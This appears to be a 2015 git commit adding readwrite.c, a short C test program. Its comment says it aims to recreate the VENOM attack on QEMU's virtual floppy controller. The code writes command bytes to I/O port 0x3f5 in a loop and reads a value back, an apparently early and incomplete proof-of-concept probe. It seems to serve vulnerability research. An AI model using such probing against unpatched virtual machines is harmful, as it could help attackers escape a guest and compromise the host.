9b4dfb4aaa88395150e7de4c4c1bbcc60d7f6862
yihao <yzhng127@illinois.edu>
2015-06-16 15:37:59 -0500

    try write and read

---
+++ readwrite.c
@@ -0,0 +1,30 @@
+/*this is a copy of the old test code that does read and write, might be useful later
+It's aim is to exploit and recreate possible Venom attack on QEMU before patch
+6/2/2015  Yihao Zhang*/
+#include<stdio.h>
+#include<sys/io.h>
+#define FIFO 0x3f5
+#define RDID 0x0a
+#define SPC_COMMAND 0x8e
+#define MAX_COUNT 5
+#define TEST_VAL  0x12
+#define FD_CMD_READ 0x06
+#define WRITE 0x05
+
+int main(void){
+        iopl(3);
+        ioperm(FIFO, 1, 1);
+	// printf("write spc_command to port\n");
+        outb(WRITE, FIFO);
+        int i,j;
+        j = 0;
+        printf("into loop\n");
+        for(i=0; i<MAX_COUNT; i++ ){
+                outb(RDID,0x3f5);
+        }
+        // outb(TEST_VAL, FIFO);
+        // outb(RDID, FIFO);
+        // outb(TEST_VAL, FIFO);
+        outb(FD_CMD_READ, FIFO);
+        printf("try read: %d\n", inb(0x3f5));
+}
